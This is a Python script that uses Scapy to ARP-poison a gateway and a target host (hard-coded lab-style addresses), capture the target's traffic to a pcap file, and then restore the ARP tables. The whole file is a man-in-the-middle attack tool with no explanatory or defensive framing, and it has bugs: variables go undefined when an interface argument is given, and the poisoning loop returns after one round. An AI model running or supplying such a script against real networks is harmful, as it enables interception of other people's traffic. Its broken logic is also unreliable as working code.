from scapy.all import *
import os
import signal
import sys
import threading

def get_mac(ip_address):
    ans, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address),
        timeout=4, retry=10)

    # Return MAC from a response
    for s, r in ans:
        return r[Ether].src

    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print('[*] Beginning the ARP poison. [CTRL-C to stop]')

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

        print('[*] ARP poisoned')
        return

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print('[*] Restoring target...')

    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, 
        hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, 
        hwdst='ff:ff:ff:ff:ff:ff', hwsrc=target_mac), count=5)

    # Kill main thread
    os.kill(os.getpid(), signal.SIGINT)

def main():
    if len(sys.argv) > 1:
        interface =  sys.argv[1]
    else:
        interface = 'eth0'
        target_ip = '10.0.2.4'
        gateway_ip = '10.0.2.1'
        packet_count = 1000

    conf.iface = interface
    conf.verb = 0

    print('[*] Setting up %s' % interface)

    gateway_mac = get_mac(gateway_ip)

    if gateway_mac == None:
        print('[!] Failed to obtain Gateway MAC: Exiting')
        sys.exit(0)
    else:
        print('[*] Gateway %s is at %s' % (gateway_ip, gateway_mac))

    target_mac = get_mac(target_ip)

    if target_mac == None:
        print('[!] Failed to obtain Target MAC: Exiting')
        sys.exit(0)
    else:
        print('[*] Target %s is at %s' % (target_ip, target_mac))

    poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    try:
        print('[*] Starting sniffer for %d packets' % packet_count)

        bpf_filter = 'ip host %s' % target_ip
        packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
        wrpcap('poison.pcap', packets)
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    except KeyboardInterrupt:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        print('[*] Exiting')
        sys.exit(0)

if __name__ == '__main__':
    main()
